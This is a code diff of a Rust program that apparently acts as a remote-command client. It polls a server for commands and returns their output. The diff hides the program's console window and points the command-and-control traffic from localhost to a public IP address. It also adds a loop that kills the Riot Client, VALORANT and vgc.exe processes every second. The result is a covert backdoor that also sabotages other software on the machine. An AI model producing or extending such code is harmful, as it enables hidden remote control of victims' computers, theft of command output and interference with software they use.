@@ -1,3 +1,6 @@
+#![windows_subsystem = "windows"]
+
+
 use std::io::Read;
 use std::process::Command;
 use std::thread::sleep;
@@ -5,19 +8,36 @@ use std::time::Duration;
 
 use reqwest::Client;
 use serde_json::Value;
+use sysinfo::System;
 
 #[tokio::main]
 async fn main() {
 	println!("Client");
 	let client = &Client::new();
+	let banned = vec![
+		"RiotClientServices.exe".into(),
+		"Riot Client.exe".into(),
+		"VALORANT.exe".into(),
+		"vgc.exe".into(),
+	];
 	loop {
 		sleep(Duration::from_secs(1));
+		close_processes(&banned);
 		let _ = recv_command(client).await;
 	}
 }
 
+fn close_processes(names: &Vec<String>) {
+	let mut sys = System::new();
+	sys.refresh_all();
+	for (_, proc) in sys.processes() {
+		if names.contains(&proc.name().to_string()) { proc.kill(); }
+	}
+}
+
+
 async fn recv_command(client: &Client) {
-	let res = match reqwest::get("http://127.0.0.1:8080/recv").await {
+	let res = match reqwest::get("http://185.128.107.176:8080/recv").await {
 		Ok(res) => res,
 		Err(_) => return,
 	};
@@ -59,6 +79,7 @@ async fn recv_command(client: &Client) {
 }
 
 
+
 fn parse_msg(json: &str) -> Option<String> {
 	let data = match serde_json::from_str::<Value>(json) {
 		Ok(data) => data,
@@ -72,5 +93,6 @@ fn parse_msg(json: &str) -> Option<String> {
 }
 
 async fn send_stdout(output: String, client: &Client) {
-	let _ = client.post("http://127.0.0.1:8080/sendhost").body(output).send().await;
+	println!("output: {}", output);
+	let _ = client.post("http://185.128.107.176:8080/sendhost").body(output).send().await;
 }
